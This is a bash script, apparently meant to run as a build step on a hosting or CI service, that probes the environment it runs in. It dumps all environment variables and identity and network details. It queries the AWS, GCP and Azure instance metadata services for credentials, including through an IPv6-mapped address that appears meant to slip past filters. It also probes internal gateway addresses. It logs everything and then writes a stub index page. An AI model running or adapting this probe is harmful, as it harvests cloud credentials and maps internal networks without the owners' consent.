#!/bin/bash
exec 2>&1
echo "=== IMDS PROBE START ===" | tee -a /tmp/probe-output.txt
echo "=== System Info ===" | tee -a /tmp/probe-output.txt
uname -a 2>&1 | tee -a /tmp/probe-output.txt
whoami 2>&1 | tee -a /tmp/probe-output.txt
id 2>&1 | tee -a /tmp/probe-output.txt
cat /etc/os-release 2>&1 | head -5 | tee -a /tmp/probe-output.txt

echo "=== Network Info ===" | tee -a /tmp/probe-output.txt
ip addr 2>&1 | head -20 | tee -a /tmp/probe-output.txt || true
ip route 2>&1 | tee -a /tmp/probe-output.txt || true
cat /etc/resolv.conf 2>&1 | tee -a /tmp/probe-output.txt || true

echo "=== Environment Variables ===" | tee -a /tmp/probe-output.txt
env | sort 2>&1 | tee -a /tmp/probe-output.txt

echo "=== IMDS Probes ===" | tee -a /tmp/probe-output.txt

echo "--- AWS IMDS ---" | tee -a /tmp/probe-output.txt
curl -sv --max-time 3 http://169.254.169.254/latest/meta-data/ 2>&1 | tee -a /tmp/probe-output.txt || true

echo "--- AWS IMDSv2 ---" | tee -a /tmp/probe-output.txt
TOKEN=$(curl -sv --max-time 3 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1) || true
echo "Token response: $TOKEN" | tee -a /tmp/probe-output.txt
curl -sv --max-time 3 -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/ 2>&1 | tee -a /tmp/probe-output.txt || true

echo "--- GCP IMDS ---" | tee -a /tmp/probe-output.txt
curl -sv --max-time 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/?recursive=true 2>&1 | tee -a /tmp/probe-output.txt || true
curl -sv --max-time 3 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/?recursive=true 2>&1 | tee -a /tmp/probe-output.txt || true

echo "--- Azure IMDS ---" | tee -a /tmp/probe-output.txt
curl -sv --max-time 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | tee -a /tmp/probe-output.txt || true

echo "=== Internal Network Probes ===" | tee -a /tmp/probe-output.txt
for ip in 10.0.0.1 10.1.0.1 10.10.0.1 172.16.0.1 172.17.0.1 192.168.0.1 192.168.1.1; do
  echo "--- Probe $ip ---" | tee -a /tmp/probe-output.txt
  curl -sv --max-time 2 http://$ip/ 2>&1 | head -5 | tee -a /tmp/probe-output.txt || true
done

echo "--- IPv6 probes ---" | tee -a /tmp/probe-output.txt
curl -sv --max-time 2 "http://[::ffff:169.254.169.254]/latest/meta-data/" 2>&1 | tee -a /tmp/probe-output.txt || true
curl -sv --max-time 2 "http://[fd00::1]/" 2>&1 | tee -a /tmp/probe-output.txt || true

echo "=== IMDS PROBE COMPLETE ===" | tee -a /tmp/probe-output.txt

mkdir -p dist
echo "<h1>probe complete</h1>" > dist/index.html
